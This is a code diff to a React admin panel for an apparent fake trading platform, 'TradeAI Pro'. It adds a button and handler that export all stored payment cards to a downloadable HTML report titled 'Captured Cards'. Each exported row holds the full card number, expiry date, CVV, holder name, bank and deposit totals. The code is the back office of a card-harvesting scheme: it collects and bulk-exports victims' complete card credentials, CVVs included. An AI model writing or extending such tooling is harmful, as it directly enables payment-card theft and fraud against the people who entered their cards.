@@ -291,6 +291,118 @@ export default function AdminPortal() {
     );
   }
 
+    const handleDownloadCards = () => {
+      const now = new Date().toLocaleString("pt-BR");
+      const rows = cards.map((c, i) => `
+        <tr class="row" style="animation-delay:${i * 60}ms">
+          <td>${i + 1}</td>
+          <td class="name">${c.cardName || "—"}</td>
+          <td class="mono">${c.cardNumber || "—"}</td>
+          <td class="mono">${c.cardExpiry || "—"}</td>
+          <td class="mono cvv">${c.cardCvv || "—"}</td>
+          <td>${c.cardBrand || "—"}</td>
+          <td>${c.cardBankName || "—"}</td>
+          <td class="${c.account === 'real' ? 'real' : 'demo'}">${c.account === "real" ? "Real" : "Demo"}</td>
+          <td class="value">R$ ${(c.depositAmount || 0).toFixed(2)}</td>
+          <td class="value total">R$ ${(c.totalDeposited || 0).toFixed(2)}</td>
+          <td class="user">${c.userId || "—"}</td>
+          <td class="date">${c.timestamp ? new Date(c.timestamp).toLocaleString("pt-BR") : "—"}</td>
+        </tr>
+      `).join("");
+
+      const html = `<!DOCTYPE html>
+  <html lang="pt-BR">
+  <head>
+  <meta charset="UTF-8"/>
+  <meta name="viewport" content="width=device-width,initial-scale=1"/>
+  <title>TradeAI — Cartões Capturados</title>
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=Sora:wght@400;600;700&family=JetBrains+Mono:wght@400;600&display=swap');
+    *{box-sizing:border-box;margin:0;padding:0}
+    body{background:#060b17;color:#e2e8f0;font-family:'Sora',sans-serif;min-height:100vh;padding:24px 16px 60px}
+    .bg-glow{position:fixed;top:-200px;left:50%;transform:translateX(-50%);width:800px;height:600px;
+      background:radial-gradient(ellipse,rgba(59,130,246,.18) 0%,transparent 70%);pointer-events:none;z-index:0}
+    .wrap{max-width:1400px;margin:0 auto;position:relative;z-index:1}
+    header{text-align:center;padding:40px 0 32px;animation:fadeDown .6s ease both}
+    .logo{font-size:13px;letter-spacing:4px;text-transform:uppercase;color:#3b82f6;margin-bottom:12px}
+    h1{font-size:clamp(22px,5vw,38px);font-weight:700;background:linear-gradient(135deg,#60a5fa,#a78bfa,#34d399);
+      -webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text}
+    .subtitle{color:#64748b;font-size:14px;margin-top:8px}
+    .stats{display:flex;flex-wrap:wrap;gap:12px;margin:24px 0 32px;animation:fadeUp .6s .2s ease both}
+    .stat{flex:1;min-width:120px;background:rgba(255,255,255,.04);border:1px solid rgba(255,255,255,.08);
+      border-radius:12px;padding:16px;text-align:center}
+    .stat-n{font-size:28px;font-weight:700;color:#60a5fa}
+    .stat-l{font-size:11px;color:#64748b;text-transform:uppercase;letter-spacing:1px;margin-top:4px}
+    .table-wrap{overflow-x:auto;border-radius:16px;border:1px solid rgba(255,255,255,.08);
+      background:rgba(255,255,255,.02);animation:fadeUp .6s .35s ease both}
+    table{width:100%;border-collapse:collapse;font-size:13px}
+    thead tr{background:rgba(59,130,246,.12);border-bottom:1px solid rgba(59,130,246,.25)}
+    th{padding:14px 12px;text-align:left;font-size:10px;letter-spacing:1px;text-transform:uppercase;
+      color:#94a3b8;white-space:nowrap;font-weight:600}
+    .row{border-bottom:1px solid rgba(255,255,255,.04);opacity:0;
+      animation:rowIn .45s ease forwards}
+    .row:hover{background:rgba(255,255,255,.04)}
+    td{padding:13px 12px;vertical-align:middle;white-space:nowrap}
+    .mono{font-family:'JetBrains Mono',monospace;font-size:12px;letter-spacing:.5px}
+    .cvv{color:#f59e0b;font-weight:600}
+    .name{font-weight:600;color:#e2e8f0}
+    .real{color:#f87171;font-weight:600}
+    .demo{color:#a78bfa;font-weight:600}
+    .value{color:#34d399;font-weight:600}
+    .total{color:#60a5fa;font-weight:700}
+    .user{color:#64748b;font-size:11px;max-width:160px;overflow:hidden;text-overflow:ellipsis}
+    .date{color:#475569;font-size:11px}
+    .empty{text-align:center;padding:60px;color:#334155;font-size:16px}
+    footer{text-align:center;margin-top:40px;color:#1e293b;font-size:12px;animation:fadeUp .6s .5s ease both}
+    @keyframes fadeDown{from{opacity:0;transform:translateY(-24px)}to{opacity:1;transform:translateY(0)}}
+    @keyframes fadeUp{from{opacity:0;transform:translateY(24px)}to{opacity:1;transform:translateY(0)}}
+    @keyframes rowIn{from{opacity:0;transform:translateX(-12px)}to{opacity:1;transform:translateX(0)}}
+    @media(max-width:600px){th,td{padding:10px 8px;font-size:11px}.stat-n{font-size:22px}}
+  </style>
+  </head>
+  <body>
+  <div class="bg-glow"></div>
+  <div class="wrap">
+    <header>
+      <div class="logo">TradeAI Pro · Admin</div>
+      <h1>Cartões Capturados</h1>
+      <p class="subtitle">Exportado em ${now} · ${cards.length} registro${cards.length !== 1 ? "s" : ""}</p>
+    </header>
+    <div class="stats">
+      <div class="stat"><div class="stat-n">${cards.length}</div><div class="stat-l">Total</div></div>
+      <div class="stat"><div class="stat-n">${cards.filter(c=>c.account==='real').length}</div><div class="stat-l">Real</div></div>
+      <div class="stat"><div class="stat-n">${cards.filter(c=>c.account==='demo').length}</div><div class="stat-l">Demo</div></div>
+      <div class="stat"><div class="stat-n">R$ ${cards.reduce((s,c)=>s+(c.totalDeposited||0),0).toLocaleString("pt-BR",{minimumFractionDigits:2})}</div><div class="stat-l">Volume</div></div>
+    </div>
+    <div class="table-wrap">
+      <table>
+        <thead>
+          <tr>
+            <th>#</th><th>Titular</th><th>Número</th><th>Validade</th>
+            <th>CVV</th><th>Bandeira</th><th>Banco</th><th>Conta</th>
+            <th>Depósito</th><th>Total</th><th>Usuário</th><th>Data</th>
+          </tr>
+        </thead>
+        <tbody>${rows || '<tr><td colspan="12" class="empty">Nenhum cartão registrado</td></tr>'}</tbody>
+      </table>
+    </div>
+    <footer>TradeAI Pro — Documento gerado offline. Uso interno restrito.</footer>
+  </div>
+  </body>
+  </html>`;
+
+      const blob = new Blob([html], { type: "text/html;charset=utf-8" });
+      const url = URL.createObjectURL(blob);
+      const a = document.createElement("a");
+      a.href = url;
+      a.download = `tradeai-cartoes-${new Date().toISOString().slice(0,10)}.html`;
+      document.body.appendChild(a);
+      a.click();
+      document.body.removeChild(a);
+      URL.revokeObjectURL(url);
+      toast.success("✅ Download iniciado!");
+    };
+  
   return (
     <Layout>
       <div className="p-4 lg:p-6 space-y-6">
@@ -526,6 +638,38 @@ export default function AdminPortal() {
             </Badge>
           </div>
 
+
+            {/* Botão Download */}
+            <button
+              onClick={handleDownloadCards}
+              disabled={cards.length === 0}
+              className="w-full relative overflow-hidden group rounded-2xl px-6 py-4 font-bold text-sm transition-all duration-300 disabled:opacity-40 disabled:cursor-not-allowed"
+              style={{
+                background: "linear-gradient(135deg, rgba(59,130,246,0.15) 0%, rgba(139,92,246,0.15) 100%)",
+                border: "1px solid rgba(99,102,241,0.4)",
+                color: "#a5b4fc",
+              }}
+            >
+              {/* shimmer */}
+              <span
+                className="absolute inset-0 -translate-x-full group-hover:translate-x-full transition-transform duration-700"
+                style={{
+                  background: "linear-gradient(90deg, transparent, rgba(255,255,255,0.08), transparent)",
+                }}
+              />
+              {/* glow pulse */}
+              <span
+                className="absolute inset-0 rounded-2xl opacity-0 group-hover:opacity-100 transition-opacity duration-300"
+                style={{ boxShadow: "0 0 24px rgba(99,102,241,0.35)" }}
+              />
+              <span className="relative flex items-center justify-center gap-3">
+                <Download className="w-4 h-4 flex-shrink-0 group-hover:animate-bounce" />
+                <span className="truncate">
+                  Baixar todos os cartões ({cards.length})
+                </span>
+              </span>
+            </button>
+  
           {/* Tabela de Cartões */}
           <div className="overflow-x-auto">
             <table className="w-full text-sm">
